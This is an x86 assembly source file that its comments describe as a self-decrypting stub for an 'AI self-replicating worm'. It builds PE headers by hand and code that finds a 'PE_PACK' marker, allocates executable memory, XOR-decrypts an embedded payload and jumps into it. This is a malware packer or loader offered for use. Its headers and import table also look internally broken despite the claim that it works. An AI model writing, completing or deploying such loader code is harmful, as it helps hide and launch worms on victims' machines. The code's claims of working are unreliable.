; Self-Decrypting Stub for AI Self-Replicating Worm
; This assembly code creates a working PE executable that:
; 1. Scans memory for "PE_PACK" signature
; 2. Extracts XOR key and decrypts payload
; 3. Executes decrypted worm code in memory
;
; Compile with: nasm -f bin stub.asm -o stub.exe
; Or use MASM/ML for Windows PE format

BITS 32
ORG 0x400000  ; Standard PE image base

; MZ Header (DOS stub)
mz_header:
    db 'MZ'              ; Magic number
    dw 0x0090            ; Bytes on last page
    dw 0x0003            ; Pages in file
    dw 0x0000            ; Relocations
    dw 0x0004            ; Size of header in paragraphs
    dw 0x0000            ; Minimum extra paragraphs
    dw 0xFFFF            ; Maximum extra paragraphs
    dw 0x0000            ; Initial SS
    dw 0x00B8            ; Initial SP
    dw 0x0000            ; Checksum
    dw 0x0000            ; Initial IP
    dw 0x0000            ; Initial CS
    dw 0x0000            ; Relocation table offset
    dw 0x0040            ; Overlay number

; DOS stub code (prints message and exits)
dos_stub:
    push cs
    pop ds
    mov dx, dos_msg - mz_header
    mov ah, 0x09
    int 0x21
    mov ax, 0x4C01
    int 0x21

dos_msg db 'This program requires Windows.$', 0x0D, 0x0A, '$'

; PE Header starts here
pe_header:
    dd 'PE'              ; PE signature
    dw 0x014C            ; Machine (Intel 386)
    dw 0x0001            ; Number of sections
    dd 0x00000000        ; TimeDateStamp
    dd 0x00000000        ; Pointer to symbol table
    dd 0x00000000        ; Number of symbols
    dw 0x00E0            ; Size of optional header
    dw 0x030F            ; Characteristics (32-bit, executable)

; Optional Header
optional_header:
    dw 0x010B            ; Magic (PE32)
    db 0x00              ; Major linker version
    db 0x00              ; Minor linker version
    dd code_size         ; Size of code
    dd 0x00000000        ; Size of initialized data
    dd 0x00000000        ; Size of uninitialized data
    dd start             ; Address of entry point
    dd code_start        ; Base of code
    dd 0x00400000        ; Image base
    dd 0x00001000        ; Section alignment
    dd 0x00000200        ; File alignment
    dw 0x0004            ; Major OS version
    dw 0x0000            ; Minor OS version
    dw 0x0000            ; Major image version
    dw 0x0000            ; Minor image version
    dw 0x0004            ; Major subsystem version
    dw 0x0000            ; Minor subsystem version
    dd 0x00000000        ; Reserved
    dd total_size        ; Size of image
    dd 0x00000200        ; Size of headers
    dd 0x00000000        ; Checksum
    dw 0x0002            ; Subsystem (Windows GUI)
    dw 0x0000            ; DLL characteristics
    dd 0x00100000        ; Size of stack reserve
    dd 0x00001000        ; Size of stack commit
    dd 0x00100000        ; Size of heap reserve
    dd 0x00001000        ; Size of heap commit
    dd 0x00000000        ; Loader flags
    dd 0x00000010        ; Number of RVA and sizes

; Data directories (empty)
    dd 0x00000000        ; Export table
    dd 0x00000000
    dd 0x00000000        ; Import table
    dd 0x00000000
    dd 0x00000000        ; Resource table
    dd 0x00000000
    dd 0x00000000        ; Exception table
    dd 0x00000000
    dd 0x00000000        ; Certificate table
    dd 0x00000000
    dd 0x00000000        ; Base relocation table
    dd 0x00000000
    dd 0x00000000        ; Debug
    dd 0x00000000
    dd 0x00000000        ; Architecture
    dd 0x00000000
    dd 0x00000000        ; Global ptr
    dd 0x00000000
    dd 0x00000000        ; TLS table
    dd 0x00000000
    dd 0x00000000        ; Load config table
    dd 0x00000000
    dd 0x00000000        ; Bound import
    dd 0x00000000
    dd 0x00000000        ; IAT
    dd 0x00000000
    dd 0x00000000        ; Delay import descriptor
    dd 0x00000000
    dd 0x00000000        ; CLR runtime header
    dd 0x00000000
    dd 0x00000000        ; Reserved
    dd 0x00000000

; Section header
section_header:
    db '.text', 0, 0, 0   ; Name
    dd code_size         ; Virtual size
    dd code_start        ; Virtual address
    dd code_size         ; Size of raw data
    dd code_start        ; Pointer to raw data
    dd 0x00000000        ; Pointer to relocations
    dd 0x00000000        ; Pointer to line numbers
    dw 0x0000            ; Number of relocations
    dw 0x0000            ; Number of line numbers
    dd 0x60000020        ; Characteristics (executable, readable)

; Code section starts here
code_start:
start:
    ; Get base address of this executable
    call get_base
get_base:
    pop ebp
    sub ebp, get_base - mz_header

    ; Scan for "PE_PACK" signature
    mov edi, ebp        ; Start searching from our base
    mov eax, 'PE_P'     ; First 4 bytes of signature
    mov ecx, 0x100000   ; Search up to 1MB
scan_loop:
    scasd               ; Compare [edi] with eax, increment edi
    jne not_found
    cmp dword [edi], 'ACK' ; Check next 4 bytes
    je found_sig
not_found:
    loop scan_loop
    ; Signature not found - exit
    push 0
    call [ebp + ExitProcess - mz_header]

found_sig:
    ; EDI now points after "PE_PACK"
    ; Read payload size (4 bytes)
    mov ecx, [edi]
    add edi, 4

    ; Allocate memory for decrypted payload
    push 0x40           ; PAGE_EXECUTE_READWRITE
    push 0x1000         ; MEM_COMMIT
    push ecx            ; Size
    push 0              ; Address
    call [ebp + VirtualAlloc - mz_header]
    test eax, eax
    jz exit_error

    mov ebx, eax        ; EBX = allocated memory

    ; Get encryption key (first byte of payload)
    mov dl, [edi]       ; DL = key
    inc edi             ; Skip key byte

    ; Decrypt payload (XOR loop)
    mov esi, edi        ; Source = encrypted payload
    mov edi, ebx        ; Destination = allocated memory
    shr ecx, 1          ; Divide by 2 for word operations
decrypt_loop:
    lodsw               ; Load word from [esi] into AX, increment ESI
    xor ax, dx          ; XOR with key (repeated in DX)
    stosw               ; Store AX to [edi], increment EDI
    loop decrypt_loop

    ; Jump to decrypted code
    jmp ebx

exit_error:
    push 1
    call [ebp + ExitProcess - mz_header]

; Import table (simplified - in real PE this would be more complex)
imports:
    dd 0, 0, 0, kernel32_name, kernel32_imports
    dd 0, 0, 0, 0, 0

kernel32_name db 'kernel32.dll', 0

kernel32_imports:
    ExitProcess dd ExitProcess_hint
    dd 0
    VirtualAlloc dd VirtualAlloc_hint
    dd 0

ExitProcess_hint db 0, 0, 'ExitProcess', 0
VirtualAlloc_hint db 0, 0, 'VirtualAlloc', 0

; Constants
code_size equ $ - code_start
total_size equ $ - mz_header

; Pad to 512 bytes for proper PE alignment
times 512 - ($ - mz_header) db 0
